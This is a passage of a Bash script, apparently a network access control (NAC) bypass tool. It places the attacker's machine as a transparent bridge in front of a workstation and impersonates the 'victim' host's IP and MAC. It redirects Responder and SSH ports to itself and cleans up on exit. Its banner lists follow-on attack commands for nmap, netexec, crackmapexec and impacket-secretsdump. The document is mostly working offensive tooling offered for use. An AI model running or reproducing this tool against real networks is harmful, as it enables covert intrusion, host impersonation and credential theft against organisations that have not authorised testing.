        || "$CMD_IPTABLES" -t nat -A "$NAC_NAT_OUT" -o "$BRINT" -s "$BRIP" -p udp  -j SNAT --to "$COMIP:$SNAT_RANGE"
    "$CMD_IPTABLES" -t nat -A "$NAC_NAT_OUT" -o "$BRINT" -s "$BRIP" -p icmp -j SNAT --to "$COMIP"

    # Optional service redirection
    [ "$OPT_SSH" -eq 1 ]       && install_ssh_redirect
    [ "$OPT_RESPONDER" -eq 1 ] && install_responder_redirect

    # Now that NAT is in place, lift the egress lock
    remove_egress_lock

    CONN_ACTIVE=1
    state_set "masquerade_active" "1"

    # Warn about competing default routes
    local others
    others=$("$CMD_IP" -4 route show default 2>/dev/null | grep -v "dev $BRINT" || true)
    if [ -n "$others" ]; then
        warn "Other default routes still present (may steal egress):"
        while IFS= read -r l; do warn "    $l"; done <<<"$others"
        warn "Pin tools to $BRINT (e.g. nmap -e $BRINT -S $BRIP) if egress is wrong."
    fi

    ok "Masquerade active. Outbound traffic from this host appears as $COMIP/$COMPMAC."
}

remove_masquerade() {
    debug "Removing masquerade rules..."

    nac_chains_destroy

    if [ -n "$(state_get neigh_static)" ]; then
        "$CMD_IP" neigh del "$BRGW" dev "$BRINT" 2>/dev/null || true
        rm -f "$STATE_DIR/neigh_static"
    fi

    if [ -n "$(state_get route_default_added)" ]; then
        "$CMD_IP" route del default via "$BRGW" dev "$BRINT" 2>/dev/null || true
        rm -f "$STATE_DIR/route_default_added"
    fi

    "$CMD_IP" addr del "$BRIP/$BRMASK_BITS" dev "$BRINT" 2>/dev/null || true

    rm -f "$STATE_DIR/masquerade_active"
}

#==============================================================================
# Service redirection (rules go into the named chains)
#==============================================================================
install_ssh_redirect() {
    log "Installing SSH redirect ($COMIP:$DPORT_SSH -> $BRIP:$PORT_SSH)..."
    "$CMD_IPTABLES" -t nat -A "$NAC_NAT_IN" -i "$BRINT" -d "$COMIP" -p tcp \
        --dport "$DPORT_SSH" -j DNAT --to "$BRIP:$PORT_SSH"

    if systemctl list-unit-files ssh.service 2>/dev/null | grep -q ssh.service; then
        if ! systemctl is-active --quiet ssh.service; then
            systemctl start ssh.service && state_set "ssh_started" "1"
        fi
    elif systemctl list-unit-files sshd.service 2>/dev/null | grep -q sshd.service; then
        if ! systemctl is-active --quiet sshd.service; then
            systemctl start sshd.service && state_set "sshd_started" "1"
        fi
    fi
}

install_responder_redirect() {
    log "Installing Responder redirects (victim ports -> $BRIP)..."
    local p
    for p in "${RESPONDER_TCP_PORTS[@]}"; do
        "$CMD_IPTABLES" -t nat -A "$NAC_NAT_IN" -i "$BRINT" -d "$COMIP" -p tcp \
            --dport "$p" -j DNAT --to "$BRIP:$p"
    done
    for p in "${RESPONDER_UDP_PORTS[@]}"; do
        "$CMD_IPTABLES" -t nat -A "$NAC_NAT_IN" -i "$BRINT" -d "$COMIP" -p udp \
            --dport "$p" -j DNAT --to "$BRIP:$p"
    done
}

#==============================================================================
# Cleanup - reverses everything that left a marker in $STATE_DIR.
#==============================================================================
cleanup_on_error() {
    if [ "$INITIALISED" -eq 1 ] || [ "$CONN_ACTIVE" -eq 1 ] \
       || ([ -d "$STATE_DIR" ] && [ -n "$(ls -A "$STATE_DIR" 2>/dev/null)" ]); then
        full_reset
    fi
}

full_reset() {
    [ "$RESET_DONE" -eq 1 ] && return 0
    RESET_DONE=1
    log "Cleaning up - reverting host state..."

    remove_masquerade
    remove_egress_lock

    # Take the bridge down and detach members
    if has_iface "$BRINT"; then
        "$CMD_IP" link set "$BRINT" down 2>/dev/null || true
        for iface in "$SWINT" "$COMPINT"; do
            if [ "$(iface_master "$iface" 2>/dev/null)" = "$BRINT" ]; then
                "$CMD_IP" link set "$iface" nomaster 2>/dev/null || true
            fi
        done
        "$CMD_IP" link del "$BRINT" 2>/dev/null || true
    fi

    # Bring the physical NICs back to a usable state                    CRIT-6
    for iface in "$SWINT" "$COMPINT"; do
        if has_iface "$iface"; then
            "$CMD_IP" link set "$iface" promisc off 2>/dev/null || true
            "$CMD_IP" link set "$iface" multicast on 2>/dev/null || true
            "$CMD_IP" link set "$iface" up 2>/dev/null || true
        fi
    done

    # Restore sysctls we changed
    [ -n "$(state_get ip_forward)" ]        && write_sysctl net.ipv4.ip_forward                "$(state_get ip_forward)"        || true
    [ -n "$(state_get ipv6_disable_all)" ]  && write_sysctl net.ipv6.conf.all.disable_ipv6     "$(state_get ipv6_disable_all)"  || true
    [ -n "$(state_get br_nf_call_ipt)" ]    && write_sysctl net.bridge.bridge-nf-call-iptables "$(state_get br_nf_call_ipt)"    || true
    [ -n "$(state_get icmp_ignore_bcast)" ] && write_sysctl net.ipv4.icmp_echo_ignore_broadcasts "$(state_get icmp_ignore_bcast)" || true

    # Restore resolv.conf
    if [ -f "$STATE_DIR/resolv.conf.bak" ]; then
        cp -a "$STATE_DIR/resolv.conf.bak" /etc/resolv.conf
    fi

    # Restore default routes that existed pre-run                       CRIT-2
    if [ -s "$STATE_DIR/default_routes.bak" ]; then
        while IFS= read -r r; do
            [ -z "$r" ] && continue
            # Only restore routes NOT going through our bridge (which is gone)
            [[ "$r" == *"dev $BRINT"* ]] && continue
            # ip route show output is parsable directly by ip route add
            "$CMD_IP" route add $r 2>/dev/null || true
        done < "$STATE_DIR/default_routes.bak"
    fi

    # Stop services we started; restart services we stopped
    [ "$(state_get ssh_started)"  = "1" ] && systemctl stop ssh.service  2>/dev/null || true
    [ "$(state_get sshd_started)" = "1" ] && systemctl stop sshd.service 2>/dev/null || true

    if [ -f "$STATE_DIR/ntp_stopped" ]; then
        while IFS= read -r svc; do
            [ -n "$svc" ] && systemctl start "$svc" 2>/dev/null
        done < "$STATE_DIR/ntp_stopped"
    fi
    timedatectl set-ntp true 2>/dev/null || true

    if [ -f "$STATE_DIR/services_stopped" ]; then
        while IFS= read -r svc; do
            [ -n "$svc" ] && systemctl start "$svc" 2>/dev/null
        done < "$STATE_DIR/services_stopped"
    fi

    # Hand interfaces back to NetworkManager                            HIGH-6
    if [ -n "$CMD_NMCLI" ] && [ -f "$STATE_DIR/nmcli_unmanaged" ]; then
        while IFS= read -r iface; do
            [ -n "$iface" ] && "$CMD_NMCLI" device set "$iface" managed yes 2>/dev/null
        done < "$STATE_DIR/nmcli_unmanaged"
    fi

    INITIALISED=0
    CONN_ACTIVE=0

    # Persist a copy of the run log for forensics, then drop the state dir
    if [ -n "$RUN_LOG" ] && [ -f "$RUN_LOG" ]; then
        local ts; ts="$(date +'%Y%m%d-%H%M%S')"
        cp "$RUN_LOG" "/tmp/nac_bypass-$ts.log" 2>/dev/null || true
    fi

    state_clear
    ok "Cleanup complete."
}

#==============================================================================
# Trap - guarantees cleanup on EVERY exit path.
#==============================================================================
install_trap() {
    [ "$TRAP_INSTALLED" -eq 1 ] && return
    trap 'on_signal INT'  INT
    trap 'on_signal TERM' TERM
    trap 'on_signal HUP'  HUP
    trap 'on_signal QUIT' QUIT
    trap 'on_exit'        EXIT
    TRAP_INSTALLED=1
}

on_signal() {
    echo
    warn "Caught SIG$1 - tearing down before exit."
    full_reset
    trap - EXIT
    case "$1" in
        INT)  exit 130 ;;
        TERM) exit 143 ;;
        HUP)  exit 129 ;;
        QUIT) exit 131 ;;
        *)    exit 1   ;;
    esac
}

on_exit() {
    local rc=$?
    full_reset 2>/dev/null || true
    exit "$rc"
}

#==============================================================================
# Operator banner
#==============================================================================
ready_banner() {
    cat <<EOF

================================================================================
  NAC BYPASS ACTIVE - this host is reachable on the wire as the workstation.
================================================================================
   Bridge interface : $BRINT  (link-local $BRIP/$BRMASK_BITS, gw $BRGW)
   Switch-side NIC  : $SWINT  (mac $SWMAC)
   Victim-side NIC  : $COMPINT
   Victim identity  : $COMIP / $COMPMAC
   Gateway          : $GWIP / $GWMAC
   DNS              : $DNS_PRIMARY${DNS_SECONDARY:+, $DNS_SECONDARY}
   SNAT range       : $COMIP:$SNAT_RANGE
   State dir        : $STATE_DIR

   Tools sourced from this host now appear on the network as $COMIP.
   Run them in a SECOND terminal. Recommended invocations:

      nmap   -e $BRINT -S $BRIP -sT -p- <target>
      nmap   -e $BRINT -S $BRIP -Pn -sS <target>     # raw SYN
      ping   -I $BRINT <target>
      curl   --interface $BRINT <url>
      netexec smb <target>/24 -u <user> -p <pass>
      crackmapexec smb <target>
      impacket-secretsdump <user>@<target>
      responder -I $BRINT                            # if -R supplied

   Stop bridge + auto-cleanup: Ctrl+C in this terminal, or '$SCRIPT_NAME -r'.

================================================================================

EOF
}

#==============================================================================
# Continuous link-state monitor
#==============================================================================
monitor_loop() {
    local prev=0 counter=0 cur
    [ -z "$MONITOR_INTERFACE" ] && MONITOR_INTERFACE="$COMPINT"

    log "Monitor loop on $MONITOR_INTERFACE (poll=${TIMER}s, up=${THRESHOLD_UP}, down=${THRESHOLD_DOWN}). Ctrl+C to exit."

    # Treat the link as already UP at loop start (we just successfully armed)
    prev=$(iface_carrier "$MONITOR_INTERFACE")

    while :; do
        cur=$(iface_carrier "$MONITOR_INTERFACE")
        if (( cur != prev )); then
            counter=0
            if (( cur == 1 )); then log "$MONITOR_INTERFACE UP"; else log "$MONITOR_INTERFACE DOWN"; fi
        else
            ((counter++))
            if (( counter == THRESHOLD_UP && cur == 1 )); then
                if [ "$CONN_ACTIVE" -eq 0 ]; then
                    log "Stable UP - re-arming masquerade"
                    if learn; then
                        install_masquerade
                        ready_banner
                    else
                        warn "Re-arm failed; will retry on next state change."
                    fi
                fi
            elif (( counter == THRESHOLD_DOWN && cur == 0 )); then
                log "Stable DOWN - tearing down NAT (bridge stays)"
                remove_masquerade
                CONN_ACTIVE=0
            fi
        fi
        prev=$cur
        sleep "$TIMER"
    done
}

#==============================================================================
# CLI
#==============================================================================
usage() {
    local rc=${1:-0}
    cat <<EOF
$SCRIPT_NAME v$VERSION - transparent-bridge NAC bypass utility

Usage: $SCRIPT_NAME [options]

Bridge / interfaces:
  -1 <iface>   NIC plugged into the switch        (default: $SWINT)
  -2 <iface>   NIC plugged into the workstation   (default: $COMPINT)
  -b <name>    Bridge name                        (default: $BRINT)
  -I <iface>   NIC to monitor for link state      (default: same as -2)
  -g <MAC>     Pin gateway MAC manually (skips learning of GW MAC)

Egress configuration:
  -d <ip>      Primary DNS                        (default: $DNS_PRIMARY)
  -D <ip>      Secondary DNS ('' to disable)      (default: $DNS_SECONDARY)
  -m <num>     Default-route metric for our br    (default: $ROUTE_METRIC)
  -t <secs>    Learning timeout                   (default: ${LEARN_TIMEOUT}s)

Service redirection:
  -R           Enable Responder DNAT (NetBIOS/LLMNR/HTTP/SMB/...)
  -S           Enable sshd DNAT and start the service

Other:
  -r           Reset / cleanup any prior run and exit.
  -v           Verbose (DEBUG logs).
  -a           Autonomous (no interactive prompts; for unattended use).
  -h           This help.

The script ALWAYS cleans up on exit (Ctrl+C, SIGTERM, SIGHUP, error,
normal completion). It runs setup, prints a banner with the flags your
offensive tools should use, then enters a link-state monitor loop.
Use a SECOND terminal to invoke nmap / NetExec / etc. against targets.

Examples:
  sudo $SCRIPT_NAME -R -S                  # full pipeline + monitor + cleanup
  sudo $SCRIPT_NAME -1 enp1s0 -2 enp2s0    # custom NICs
  sudo $SCRIPT_NAME -r                     # clean up a prior run
EOF
    exit "$rc"
}

parse_args() {
    while getopts ":1:2:b:I:g:d:D:m:t:RSrvah" opt; do
        case "$opt" in
            "1") SWINT="$OPTARG" ;;
            "2") COMPINT="$OPTARG" ;;
            "b") BRINT="$OPTARG" ;;
            "I") MONITOR_INTERFACE="$OPTARG" ;;
            "g") GWMAC_USER="$OPTARG" ;;
            "d") DNS_PRIMARY="$OPTARG" ;;
            "D") DNS_SECONDARY="$OPTARG" ;;
            "m") ROUTE_METRIC="$OPTARG" ;;
            "t") LEARN_TIMEOUT="$OPTARG" ;;
            "R") OPT_RESPONDER=1 ;;
            "S") OPT_SSH=1 ;;
            "r") OPT_RESET_ONLY=1 ;;
            "v") OPT_VERBOSE=1 ;;
            "a") OPT_AUTONOMOUS=1 ;;
            "h") usage 0 ;;
            \?)  err "Unknown option: -$OPTARG"; usage 2 ;;
            :)   err "Option -$OPTARG requires an argument"; usage 2 ;;
        esac
    done

    # Validate CLI args                                                 MED-2
    if [ -n "$GWMAC_USER" ] && ! is_valid_mac "$GWMAC_USER"; then
        err "Invalid -g MAC: '$GWMAC_USER'"; usage 2
    fi
    is_uint "$ROUTE_METRIC"   || { err "-m must be a non-negative integer (got '$ROUTE_METRIC')"; usage 2; }
    is_uint "$LEARN_TIMEOUT"  || { err "-t must be a non-negative integer (got '$LEARN_TIMEOUT')"; usage 2; }
    is_valid_ip "$DNS_PRIMARY" || { err "-d must be a valid IP (got '$DNS_PRIMARY')"; usage 2; }
    if [ -n "$DNS_SECONDARY" ] && ! is_valid_ip "$DNS_SECONDARY"; then
        err "-D must be a valid IP or empty string (got '$DNS_SECONDARY')"; usage 2
    fi
    [ -z "$MONITOR_INTERFACE" ] && MONITOR_INTERFACE="$COMPINT"
}

#==============================================================================
# Main
#==============================================================================
main() {
    parse_args "$@"

    # Root check FIRST - before state_init / install_trap - so a non-root
    # invocation can't trigger the cleanup path on a host that has nothing
    # to clean up.
    [ "$EUID" -eq 0 ] || { err "Must run as root."; exit 1; }

    if [ "$OPT_RESET_ONLY" -eq 1 ]; then
        # Resolve binaries enough to do cleanup; tolerate missing optional ones.
        CMD_IP=$(resolve_bin ip);          [ -z "$CMD_IP" ] && die "ip(8) not found - cannot run reset."
        CMD_IPTABLES=$(resolve_bin iptables)
        CMD_EBTABLES=$(resolve_bin ebtables)
        CMD_ARPTABLES=$(resolve_bin arptables)
        CMD_NMCLI=$(resolve_bin nmcli)
        CMD_SYSCTL=$(resolve_bin sysctl)

        # Pull persisted bridge name if state survived the previous run.    HIGH-2
        if [ -d "$STATE_DIR" ]; then
            local persisted; persisted=$(state_get bridge_name)
            [ -n "$persisted" ] && BRINT="$persisted"
        fi
        state_init
        INITIALISED=1
        full_reset
        exit 0
    fi

    state_init
    install_trap
    preflight

    host_lockdown
    bridge_build
    if learn; then
        install_masquerade
        ready_banner
    else
        die "Initial learning failed. Workstation may be idle - retry with longer -t, or pin -g <gw_mac>."
    fi

    monitor_loop
}

main "$@"
